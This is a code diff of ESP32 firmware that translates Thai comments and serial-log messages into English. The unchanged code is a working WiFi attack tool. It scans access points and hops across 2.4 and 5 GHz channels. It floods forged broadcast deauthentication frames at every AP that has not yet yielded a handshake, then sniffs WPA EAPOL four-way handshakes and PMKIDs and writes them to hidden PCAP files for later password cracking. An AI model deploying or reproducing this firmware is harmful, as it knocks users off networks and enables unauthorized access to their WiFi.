@@ -11,16 +11,16 @@ void blinkLED(int duration);
 
 // ==================== MEMORY OPTIMIZATION ====================
 void optimizeMemory() {
-    // ล้าง beacon trackers ที่เก่ามาก (เกิน 30 วินาที)
+    // Clean old beacon trackers (older than 30 seconds)
     uint32_t currentTime = millis();
     int removed = 0;
     
     for (int i = 0; i < beaconTrackerCount; i++) {
         if (currentTime - beaconTrackers[i].lastSeen > 30000) {
-            // ย้าย tracker สุดท้ายมาแทนที่
+            // Move last tracker to replace this one
             if (i < beaconTrackerCount - 1) {
                 memcpy(&beaconTrackers[i], &beaconTrackers[beaconTrackerCount - 1], sizeof(BeaconTracker));
-                i--; // ตรวจสอบ index นี้อีกครั้ง
+                i--; // Check this index again
             }
             beaconTrackerCount--;
             removed++;
@@ -31,7 +31,7 @@ void optimizeMemory() {
         Serial.printf("[MEMORY] Cleaned beacon trackers: %d removed (%d remaining)\n", removed, beaconTrackerCount);
     }
     
-    // แสดงสถานะ memory
+    // Show memory status
     Serial.printf("[MEMORY] Free heap: %d bytes\n", ESP.getFreeHeap());
 }
 
@@ -48,12 +48,12 @@ void flushPcapBuffer() {
 }
 
 void writeToPcapBuffer(const uint8_t* data, uint16_t len) {
-    // ถ้า buffer เต็ม flush ก่อน
+    // If buffer is full, flush first
     if (pcapBufferPos + len > PCAP_BUFFER_SIZE) {
         flushPcapBuffer();
     }
     
-    // ถ้าข้อมูลใหญ่กว่า buffer เขียนตรงๆ
+    // If data is larger than buffer, write directly
     if (len > PCAP_BUFFER_SIZE) {
         if (fileOpen) {
             pcapFile.write(data, len);
@@ -61,7 +61,7 @@ void writeToPcapBuffer(const uint8_t* data, uint16_t len) {
         return;
     }
     
-    // เพิ่มข้อมูลลง buffer
+    // Add data to buffer
     memcpy(&pcapWriteBuffer[pcapBufferPos], data, len);
     pcapBufferPos += len;
 }
@@ -70,19 +70,19 @@ void writeToPcapBuffer(const uint8_t* data, uint16_t len) {
 bool shouldCaptureBeacon(uint8_t* bssid) {
     uint32_t currentTime = millis();
     
-    // ค้นหา beacon tracker ที่มีอยู่
+    // Find existing beacon tracker
     for (int i = 0; i < beaconTrackerCount; i++) {
         if (memcmp(beaconTrackers[i].bssid, bssid, 6) == 0) {
-            // ตรวจสอบว่าผ่านไป 100ms หรือยัง
+            // Check if 100ms has passed
             if (currentTime - beaconTrackers[i].lastSeen >= BEACON_DEDUPE_INTERVAL) {
                 beaconTrackers[i].lastSeen = currentTime;
                 return true;
             }
-            return false; // ยังไม่ถึงเวลา
+            return false; // Not time yet
         }
     }
     
-    // ไม่เจอ tracker เก่า สร้างใหม่
+    // No old tracker found, create new one
     if (beaconTrackerCount < MAX_BEACON_TRACKERS) {
         memcpy(beaconTrackers[beaconTrackerCount].bssid, bssid, 6);
         beaconTrackers[beaconTrackerCount].lastSeen = currentTime;
@@ -90,7 +90,7 @@ bool shouldCaptureBeacon(uint8_t* bssid) {
         return true;
     }
     
-    // tracker เต็ม ใช้ round-robin
+    // Tracker full, use round-robin
     int oldestIndex = 0;
     uint32_t oldestTime = beaconTrackers[0].lastSeen;
     for (int i = 1; i < MAX_BEACON_TRACKERS; i++) {
@@ -106,7 +106,7 @@ bool shouldCaptureBeacon(uint8_t* bssid) {
 }
 
 bool shouldCapturePacket(uint8_t* payload, uint16_t len) {
-    if (len < 24) return false; // ขนาดขั้นต่ำของ 802.11 frame
+    if (len < 24) return false; // Minimum size of 802.11 frame
     
     uint8_t frameType = (payload[0] & 0x0C) >> 2;
     uint8_t frameSubtype = (payload[0] & 0xF0) >> 4;
@@ -115,45 +115,45 @@ bool shouldCapturePacket(uint8_t* payload, uint16_t len) {
         case 0: // Management frames
             switch (frameSubtype) {
                 case 0x8: // Beacon
-                    // BSSID อยู่ที่ offset 16 สำหรับ beacon
-                    // เก็บ beacon เพราะอาจมี RSN IE ที่มี PMKID
+                    // BSSID is at offset 16 for beacon
+                    // Keep beacon because it may have RSN IE with PMKID
                     return shouldCaptureBeacon(&payload[16]);
                 case 0x4: // Probe Request
                 case 0x5: // Probe Response
                 case 0xB: // Authentication
-                case 0x0: // Association Request - อาจมี PMKID
-                case 0x1: // Association Response - อาจมี PMKID
-                case 0x2: // Reassociation Request - อาจมี PMKID
-                case 0x3: // Reassociation Response - อาจมี PMKID
+                case 0x0: // Association Request - may have PMKID
+                case 0x1: // Association Response - may have PMKID
+                case 0x2: // Reassociation Request - may have PMKID
+                case 0x3: // Reassociation Response - may have PMKID
                     return true;
                 default:
-                    return false; // ไม่เก็บ management frame อื่นๆ
+                    return false; // Don't keep other management frames
             }
             
-        case 2: // Data frames - เก็บเฉพาะ EAPOL
+        case 2: // Data frames - keep EAPOL only
             {
                 uint8_t dataSubtype = frameSubtype;
                 int dataOffset = 24;
                 
-                // ตรวจสอบ QoS (subtype 8-15 คือ QoS frames)
+                // Check QoS (subtype 8-15 are QoS frames)
                 if (dataSubtype >= 8) { // QoS Data
                     dataOffset = 26;
                 }
                 
-                // ตรวจสอบ EAPOL (0x888e)
+                // Check EAPOL (0x888e)
                 if (len > dataOffset + 8 && 
                     payload[dataOffset] == 0xAA && 
                     payload[dataOffset + 1] == 0xAA && 
                     payload[dataOffset + 2] == 0x03 &&
                     payload[dataOffset + 6] == 0x88 && 
                     payload[dataOffset + 7] == 0x8e) {
-                    return true; // EAPOL packet (รวม PMKID ใน M1)
+                    return true; // EAPOL packet (includes PMKID in M1)
                 }
                 
-                return false; // ไม่เก็บ data frame อื่นๆ
+                return false; // Don't keep other data frames
             }
             
-        case 1: // Control frames - ไม่เก็บเลย
+        case 1: // Control frames - don't keep
         default:
             return false;
     }
@@ -164,8 +164,8 @@ uint8_t deauthPacket[26] = {
     0xc0, 0x00,                         // Type/Subtype: Deauthentication
     0x00, 0x00,                         // Duration
     0xff, 0xff, 0xff, 0xff, 0xff, 0xff, // Destination: broadcast
-    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Source (AP BSSID) - จะถูกแทนที่
-    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID (AP BSSID) - จะถูกแทนที่
+    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Source (AP BSSID) - will be replaced
+    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID (AP BSSID) - will be replaced
     0x00, 0x00,                         // Sequence
     0x07, 0x00                          // Reason: Class 3 frame from nonassoc STA
 };
@@ -275,7 +275,7 @@ void initWiFi() {
 }
 
 // ==================== HELPER FUNCTIONS ====================
-// ตรวจสอบว่าช่องเป็น 2.4GHz หรือ 5GHz
+// Check if channel is 2.4GHz or 5GHz
 bool is5GHzChannel(uint8_t channel) {
 #if WIFI_5GHZ_SUPPORTED
     // 5GHz channels: 36-165
@@ -285,7 +285,7 @@ bool is5GHzChannel(uint8_t channel) {
 #endif
 }
 
-// แปลงช่องเป็นชื่อ band
+// Convert channel to band name
 const char* getChannelBand(uint8_t channel) {
     if (is5GHzChannel(channel)) {
         return "5GHz";
@@ -294,35 +294,35 @@ const char* getChannelBand(uint8_t channel) {
     }
 }
 
-// ตั้งค่า WiFi band สำหรับ ESP32-C5
+// Set WiFi band for ESP32-C5
 void setWiFiBand(uint8_t channel) {
 #if defined(CONFIG_IDF_TARGET_ESP32C5)
     if (is5GHzChannel(channel)) {
-        // ตั้งค่าเป็น 5GHz band
+        // Set to 5GHz band
         esp_wifi_set_band(WIFI_IF_STA, WIFI_BAND_5G);
         Serial.printf("[WIFI] Set band: 5GHz for CH%d\n", channel);
     } else {
-        // ตั้งค่าเป็น 2.4GHz band
+        // Set to 2.4GHz band
         esp_wifi_set_band(WIFI_IF_STA, WIFI_BAND_2G);
         Serial.printf("[WIFI] Set band: 2.4GHz for CH%d\n", channel);
     }
 #endif
 }
 
-// เปลี่ยนช่อง WiFi พร้อม log และตั้งค่า band
+// Change WiFi channel with log and band setting
 void changeChannel(uint8_t channel) {
-    // ตั้งค่า band สำหรับ ESP32-C5
+    // Set band for ESP32-C5
     setWiFiBand(channel);
     
-    // เปลี่ยนช่อง
+    // Change channel
     esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
     
-    // แสดง log
+    // Show log
     Serial.printf("[CHANNEL] Switched to CH%d (%s)\n", channel, getChannelBand(channel));
 }
 
 String getSSIDFromBSSID(uint8_t* bssid) {
-    // หา SSID จาก BSSID ในรายการ AP ที่สแกนได้
+    // Find SSID from BSSID in scanned AP list
     for (int i = 0; i < apCount; i++) {
         if (memcmp(apList[i].bssid, bssid, 6) == 0) {
             return String(apList[i].ssid);
@@ -437,19 +437,19 @@ void deepScanAllAPs() {
 
 // ==================== PCAP FILE FUNCTIONS ====================
 String getUniqueFilename(const char* baseFilename) {
-    // ตรวจสอบว่าไฟล์มีอยู่หรือไม่
+    // Check if file exists
     String filename = String(baseFilename);
     
     if (!SPIFFS.exists(filename)) {
         return filename;
     }
     
-    // แยกชื่อและนามสกุล
+    // Separate name and extension
     int dotPos = filename.lastIndexOf('.');
     String name = filename.substring(0, dotPos);
     String ext = filename.substring(dotPos);
     
-    // ลอง (2), (3), etc.
+    // Try (2), (3), etc.
     for (int i = 2; i < 100; i++) {
         String newFilename = name + "(" + String(i) + ")" + ext;
         if (!SPIFFS.exists(newFilename)) {
@@ -457,16 +457,16 @@ String getUniqueFilename(const char* baseFilename) {
         }
     }
     
-    // สำรอง: ใช้ timestamp
+    // Fallback: use timestamp
     return name + "_" + String(millis()) + ext;
 }
 
 void createPcapFile() {
-    // สร้างชื่อไฟล์ตามรูปแบบ /.auto_<seed-mills>.pcap
+    // Create filename in format /.auto_<seed-mills>.pcap
     char baseFilename[32];
     snprintf(baseFilename, sizeof(baseFilename), "/.auto_%lu.pcap", millis());
     
-    // ตรวจสอบชื่อไฟล์ที่ไม่ซ้ำ
+    // Check for unique filename
     String uniqueFilename = getUniqueFilename(baseFilename);
     strncpy(currentFilename, uniqueFilename.c_str(), sizeof(currentFilename) - 1);
     currentFilename[sizeof(currentFilename) - 1] = '\0';
@@ -476,7 +476,7 @@ void createPcapFile() {
     if (pcapFile) {
         fileOpen = true;
         
-        // เขียน PCAP header
+        // Write PCAP header
         pcap_hdr_t hdr;
         hdr.magic_number = 0xa1b2c3d4;
         hdr.version_major = 2;
@@ -509,14 +509,14 @@ void closePcapFile() {
 
 // ==================== PACKET HANDLER ====================
 void processEAPOLPacket(uint8_t* payload, uint16_t len, int eapolOffset) {
-    // ดึง BSSID (Address 3, bytes 16-21)
+    // Extract BSSID (Address 3, bytes 16-21)
     uint8_t bssid[6];
     memcpy(bssid, &payload[16], 6);
     
-    // หา SSID จาก BSSID
+    // Find SSID from BSSID
     String ssid = getSSIDFromBSSID(bssid);
     
-    // หาหรือสร้าง handshake entry
+    // Find or create handshake entry
     int idx = -1;
     for (int i = 0; i < handshakeCount; i++) {
         if (memcmp(handshakes[i].bssid, bssid, 6) == 0) {
@@ -561,7 +561,7 @@ void processEAPOLPacket(uint8_t* payload, uint16_t len, int eapolOffset) {
                                      ssid.c_str(),
                                      bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5],
                                      currentChannel);
-                        blinkLED(100); // กระพิบสั้น
+                        blinkLED(100); // Short blink
                     }
                 } else if (!hasAck && hasMic && !hasInstall) {
                     // Message 2 or 4
@@ -572,7 +572,7 @@ void processEAPOLPacket(uint8_t* payload, uint16_t len, int eapolOffset) {
                                      ssid.c_str(),
                                      bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5],
                                      currentChannel);
-                        blinkLED(100); // กระพิบสั้น
+                        blinkLED(100); // Short blink
                     } else if ((handshakes[idx].messageFlags & 0x04) && !(handshakes[idx].messageFlags & 0x08)) {
                         handshakes[idx].messageFlags |= 0x08;
                         Serial.printf("[HANDSHAKE] M4 #%d: %s | %02X:%02X:%02X:%02X:%02X:%02X | CH%d\n",
@@ -580,7 +580,7 @@ void processEAPOLPacket(uint8_t* payload, uint16_t len, int eapolOffset) {
                                      ssid.c_str(),
                                      bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5],
                                      currentChannel);
-                        blinkLED(500); // ติดยาว 500ms
+                        blinkLED(500); // Long blink 500ms
                     }
                 } else if (hasAck && hasMic && hasInstall) {
                     // Message 3
@@ -591,16 +591,16 @@ void processEAPOLPacket(uint8_t* payload, uint16_t len, int eapolOffset) {
                                      ssid.c_str(),
                                      bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5],
                                      currentChannel);
-                        blinkLED(100); // กระพิบสั้น
+                        blinkLED(100); // Short blink
                     }
                 }
             }
             
-            // ตรวจสอบว่าครบ 4 message หรือไม่
+            // Check if all 4 messages are complete
             if (handshakes[idx].messageFlags == 0x0F && !handshakes[idx].complete) {
                 handshakes[idx].complete = true;
                 
-                // นับจำนวน handshake ที่สมบูรณ์
+                // Count complete handshakes
                 int completeCount = 0;
                 for (int i = 0; i < handshakeCount; i++) {
                     if (handshakes[i].complete) completeCount++;
@@ -615,7 +615,7 @@ void processEAPOLPacket(uint8_t* payload, uint16_t len, int eapolOffset) {
                 Serial.printf("[SUCCESS] File: %s\n", currentFilename);
                 Serial.println("========================================");
                 
-                // กระพิบ LED 3 ครั้งเพื่อแสดงความสำเร็จ
+                // Blink LED 3 times to show success
                 for (int i = 0; i < 3; i++) {
                     blinkLED(200);
                     delay(100);
@@ -626,32 +626,32 @@ void processEAPOLPacket(uint8_t* payload, uint16_t len, int eapolOffset) {
 }
 
 void packetHandler(void* buf, wifi_promiscuous_pkt_type_t type) {
-    // Optimization: ตรวจสอบ heap ก่อนประมวลผล
+    // Optimization: Check heap before processing
     if (ESP.getFreeHeap() < 8000) return;
 
     wifi_promiscuous_pkt_t* pkt = (wifi_promiscuous_pkt_t*)buf;
     uint8_t* payload = pkt->payload;
     uint16_t len = pkt->rx_ctrl.sig_len;
 
-    // Optimization: ตรวจสอบขนาด packet ที่เหมาะสม
+    // Optimization: Check appropriate packet size
     if (len < 24 || len > 1500) return;
 
     packetCount++;
 
-    // ใช้ packet filtering ใหม่
+    // Use new packet filtering
     if (!shouldCapturePacket(payload, len)) {
-        return; // ไม่เก็บ packet นี้
+        return; // Don't keep this packet
     }
 
     filteredPacketCount++;
 
-    // ตรวจสอบ EAPOL เฉพาะ Data frame ที่ผ่านการกรองแล้ว
+    // Check EAPOL only for Data frames that passed filtering
     uint8_t frameType = (payload[0] & 0x0C) >> 2;
     if (frameType == 2) { // Data frame only
         uint8_t frameSubtype = (payload[0] & 0xF0) >> 4;
         int dataOffset = (frameSubtype >= 8) ? 26 : 24; // QoS Data : Normal Data
 
-        // ตรวจสอบ EAPOL signature
+        // Check EAPOL signature
         if (len > dataOffset + 8 &&
             payload[dataOffset] == 0xAA &&
             payload[dataOffset + 1] == 0xAA &&
@@ -663,7 +663,7 @@ void packetHandler(void* buf, wifi_promiscuous_pkt_type_t type) {
         }
     }
 
-    // เขียนไฟล์เฉพาะ packet ที่ผ่านการกรอง - ใช้ buffered write
+    // Write file only for filtered packets - use buffered write
     if (fileOpen) {
         pcaprec_hdr_t pkthdr;
         uint32_t timestamp = millis();
@@ -672,11 +672,11 @@ void packetHandler(void* buf, wifi_promiscuous_pkt_type_t type) {
         pkthdr.incl_len = len;
         pkthdr.orig_len = len;
 
-        // เขียนผ่าน buffer
+        // Write through buffer
         writeToPcapBuffer((uint8_t*)&pkthdr, sizeof(pcaprec_hdr_t));
         writeToPcapBuffer(payload, len);
 
-        // Flush ทุก 30 packets หรือเมื่อ buffer เกือบเต็ม
+        // Flush every 30 packets or when buffer is almost full
         static uint8_t flushCounter = 0;
         if (++flushCounter >= 30 || pcapBufferPos > (PCAP_BUFFER_SIZE - 1600)) {
             flushPcapBuffer();
@@ -773,19 +773,19 @@ void startCapture() {
     memset(beaconTrackers, 0, sizeof(beaconTrackers));
     isCapturing = true;
     
-    // ตั้งค่า active channel
+    // Set active channel
     if (activeChannelCount > 0) {
         activeChannelIndex = 0;
         currentChannel = activeChannels[0];
     } else {
-        // Fallback ถ้าไม่มี AP (ไม่น่าเกิด)
+        // Fallback if no APs (unlikely)
         currentChannel = 1;
     }
     
-    // สร้างไฟล์ PCAP
+    // Create PCAP file
     createPcapFile();
     
-    // เริ่ม WiFi promiscuous mode
+    // Start WiFi promiscuous mode
     WiFi.mode(WIFI_STA);
     WiFi.disconnect();
     delay(100);
@@ -793,12 +793,12 @@ void startCapture() {
     esp_wifi_set_promiscuous(true);
     esp_wifi_set_promiscuous_rx_cb(&packetHandler);
     
-    // เริ่มที่ช่องแรกที่มี AP
+    // Start at first channel with AP
     channelStartTime = millis();
     isDeauthPhase = true;
-    changeChannel(currentChannel);  // ใช้ฟังก์ชันใหม่ที่มี log
+    changeChannel(currentChannel);  // Use new function with log
     
-    Serial.printf("[CAPTURE] เริ่มที่ CH%d (%s) - Phase: DEAUTH (Active channels: %d)\n", 
+    Serial.printf("[CAPTURE] Starting at CH%d (%s) - Phase: DEAUTH (Active channels: %d)\n", 
                   currentChannel, getChannelBand(currentChannel), activeChannelCount);
 }
 
@@ -809,21 +809,21 @@ void updateCapture() {
     uint32_t timeOnChannel = currentTime - channelStartTime;
     
     if (isDeauthPhase) {
-        // Phase 1: ส่ง Deauth เป็นเวลา 2 วินาที
+        // Phase 1: Send Deauth for 2 seconds
         if (timeOnChannel >= DEAUTH_DURATION) {
-            Serial.printf("[CAPTURE] CH%d - เปลี่ยนเป็น Phase: CAPTURE\n", currentChannel);
+            Serial.printf("[CAPTURE] CH%d - Switching to Phase: CAPTURE\n", currentChannel);
             isDeauthPhase = false;
-            channelStartTime = currentTime; // รีเซ็ตเวลา
+            channelStartTime = currentTime; // Reset time
         } else {
-            // ส่ง deauth packets อย่างต่อเนื่อง
+            // Send deauth packets continuously
             static uint32_t lastDeauth = 0;
             if (currentTime - lastDeauth >= DEAUTH_INTERVAL) {
                 lastDeauth = currentTime;
                 
-                // ส่ง deauth ไปทุก AP ในช่องปัจจุบัน (ยกเว้น AP ที่ได้ handshake แล้ว)
+                // Send deauth to all APs in current channel (except APs with handshake)
                 for (int i = 0; i < apCount; i++) {
                     if (apList[i].channel == currentChannel) {
-                        // ตรวจสอบว่า AP นี้มี handshake สมบูรณ์แล้วหรือไม่
+                        // Check if this AP has complete handshake
                         bool hasCompleteHandshake = false;
                         for (int j = 0; j < handshakeCount; j++) {
                             if (memcmp(handshakes[j].bssid, apList[i].bssid, 6) == 0 && handshakes[j].complete) {
@@ -832,7 +832,7 @@ void updateCapture() {
                             }
                         }
                         
-                        // ส่ง deauth เฉพาะ AP ที่ยังไม่ได้ handshake
+                        // Send deauth only to APs without handshake
                         if (!hasCompleteHandshake) {
                             memcpy(&deauthPacket[10], apList[i].bssid, 6);
                             memcpy(&deauthPacket[16], apList[i].bssid, 6);
@@ -845,69 +845,69 @@ void updateCapture() {
             }
         }
     } else {
-        // Phase 2: Capture handshake เป็นเวลา 5 วินาที
+        // Phase 2: Capture handshake for 5 seconds
         if (timeOnChannel >= CAPTURE_DURATION) {
-            // เปลี่ยนช่อง - Hop เฉพาะช่องที่มี AP
+            // Change channel - Hop only to channels with APs
             if (activeChannelCount > 0) {
                 activeChannelIndex++;
                 if (activeChannelIndex >= activeChannelCount) {
                     activeChannelIndex = 0;
                     cycleCount++;
                     
-                    // นับ handshake ที่สมบูรณ์
+                    // Count complete handshakes
                     int completeCount = 0;
                     for (int i = 0; i < handshakeCount; i++) {
                         if (handshakes[i].complete) completeCount++;
                     }
                     
                     Serial.println("========================================");
-                    Serial.printf("[CAPTURE] รอบที่ %d เสร็จ! HS: %d/%d, PKT: %lu, DEAUTH: %lu\n", 
+                    Serial.printf("[CAPTURE] Cycle %d complete! HS: %d/%d, PKT: %lu, DEAUTH: %lu\n", 
                                  cycleCount, completeCount, handshakeCount, packetCount, deauthCount);
-                    Serial.println("[CAPTURE] เริ่มสแกน AP ใหม่เพื่อหา SSID ใหม่...");
+                    Serial.println("[CAPTURE] Starting new AP scan to find new SSIDs...");
                     Serial.println("========================================");
                     
-                    // หยุด promiscuous mode ชั่วคราว
+                    // Stop promiscuous mode temporarily
                     esp_wifi_set_promiscuous(false);
                     
-                    // สแกน AP ใหม่
+                    // Scan APs again
                     deepScanAllAPs();
                     
-                    // Optimization: ทำความสะอาด memory หลังสแกน
+                    // Optimization: Clean memory after scan
                     optimizeMemory();
                     
-                    // เริ่ม promiscuous mode ใหม่
+                    // Start promiscuous mode again
                     esp_wifi_set_promiscuous(true);
                     esp_wifi_set_promiscuous_rx_cb(&packetHandler);
                     
-                    // รีเซ็ต index ถ้าจำนวน active channels เปลี่ยน
+                    // Reset index if active channels count changed
                     if (activeChannelIndex >= activeChannelCount) {
                         activeChannelIndex = 0;
                     }
                     
                     Serial.println("========================================");
-                    Serial.printf("[CAPTURE] เริ่มรอบที่ %d - พบ AP รวม %d ตัว ใน %d ช่อง\n", 
+                    Serial.printf("[CAPTURE] Starting cycle %d - Found %d APs in %d channels\n", 
                                  cycleCount + 1, apCount, activeChannelCount);
                     Serial.println("========================================");
                 }
                 
-                // เปลี่ยนไปช่องถัดไป (เฉพาะช่องที่มี AP)
+                // Change to next channel (only channels with APs)
                 currentChannel = activeChannels[activeChannelIndex];
                 Serial.printf("[CAPTURE] ========================================\n");
-                Serial.printf("[CAPTURE] Hop ไป CH%d (%s) - (%d/%d active channels)\n", 
+                Serial.printf("[CAPTURE] Hopping to CH%d (%s) - (%d/%d active channels)\n", 
                              currentChannel, getChannelBand(currentChannel), 
                              activeChannelIndex + 1, activeChannelCount);
                 Serial.printf("[CAPTURE] ========================================\n");
             } else {
-                // Fallback: ถ้าไม่มี active channels (ไม่น่าเกิด)
+                // Fallback: if no active channels (unlikely)
                 currentChannel++;
                 if (currentChannel > MAX_CHANNELS) {
                     currentChannel = 1;
                 }
-                Serial.printf("[CAPTURE] Fallback hop ไป CH%d\n", currentChannel);
+                Serial.printf("[CAPTURE] Fallback hopping to CH%d\n", currentChannel);
             }
             
-            // เปลี่ยนช่องและรีเซ็ตเวลา
-            changeChannel(currentChannel);  // ใช้ฟังก์ชันใหม่ที่มี log และตั้งค่า band
+            // Change channel and reset time
+            changeChannel(currentChannel);  // Use new function with log and band setting
             channelStartTime = currentTime;
             isDeauthPhase = true;
             
@@ -925,27 +925,27 @@ void stopCapture() {
     closePcapFile();
     isCapturing = false;
     
-    // นับ handshake ที่สมบูรณ์
+    // Count complete handshakes
     int completeCount = 0;
     for (int i = 0; i < handshakeCount; i++) {
         if (handshakes[i].complete) completeCount++;
     }
     
-    // คำนวณ filter efficiency
+    // Calculate filter efficiency
     float filterRatio = (packetCount > 0) ? ((float)filteredPacketCount / packetCount * 100.0) : 0;
     
     Serial.println("========================================");
-    Serial.println("[CAPTURE] หยุดการดักจับ");
-    Serial.printf("[CAPTURE] สถิติรวม:\n");
-    Serial.printf("[CAPTURE] - รอบทั้งหมด: %d\n", cycleCount);
-    Serial.printf("[CAPTURE] - Handshakes: %d/%d สมบูรณ์\n", completeCount, handshakeCount);
-    Serial.printf("[CAPTURE] - Packets รวม: %lu\n", packetCount);
-    Serial.printf("[CAPTURE] - Packets กรองแล้ว: %lu (%.1f%%)\n", filteredPacketCount, filterRatio);
+    Serial.println("[CAPTURE] Capture stopped");
+    Serial.printf("[CAPTURE] Total statistics:\n");
+    Serial.printf("[CAPTURE] - Total cycles: %d\n", cycleCount);
+    Serial.printf("[CAPTURE] - Handshakes: %d/%d complete\n", completeCount, handshakeCount);
+    Serial.printf("[CAPTURE] - Total packets: %lu\n", packetCount);
+    Serial.printf("[CAPTURE] - Filtered packets: %lu (%.1f%%)\n", filteredPacketCount, filterRatio);
     Serial.printf("[CAPTURE] - Beacon trackers: %d\n", beaconTrackerCount);
     Serial.printf("[CAPTURE] - Deauth sent: %lu\n", deauthCount);
-    Serial.printf("[CAPTURE] - ไฟล์: %s\n", currentFilename);
+    Serial.printf("[CAPTURE] - File: %s\n", currentFilename);
     
-    // แสดงรายละเอียด handshakes
+    // Show handshake details
     for (int i = 0; i < handshakeCount; i++) {
         String ssid = getSSIDFromBSSID(handshakes[i].bssid);
         Serial.printf("[CAPTURE] HS%d: %s | CH%d | Flags:%d%d%d%d %s\n", 
